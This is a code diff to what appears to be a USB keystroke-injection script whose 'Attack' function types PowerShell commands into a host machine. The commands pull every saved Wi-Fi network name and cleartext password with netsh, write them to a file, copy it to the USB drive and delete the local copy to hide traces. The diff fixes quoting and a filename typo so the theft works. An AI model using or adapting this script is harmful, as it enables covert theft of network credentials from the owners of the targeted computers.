@@ -19,10 +19,10 @@ function Attack() { 		// Initalizes the function Attack that acually exfiltrates
   type("copy wirelessinfo.txt $usbpath.name;");													// Copyies wirelesspassword to the USB
   type("del wirelessinfo.txt\n");																// Delets the copy of wirelessinfo on the host
   
-  type("netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > wifikeys.txt;");
+  type('(netsh wlan show profiles) | Select-String "\\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\\W+\\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ Wifi_Name=$name;Key=$pass }} | Format-Table -AutoSize > wifikeys.txt;');
   																								// The above line gets the keys to the wifi networks
-  type("copy wifikey.txt $usbpath.name;");														// Copies wifikey to the USB
-  type("del wifikeys.txt;");																	// Deletes the copy of wifikey stored on the host
+  type("copy wifikeys.txt $usbpath.name;");														// Copies wifikeys to the USB
+  type("del wifikeys.txt;");																	// Deletes the copy of wifikeys stored on the host
   
   type("exit\n");  			// Closes out 
 }
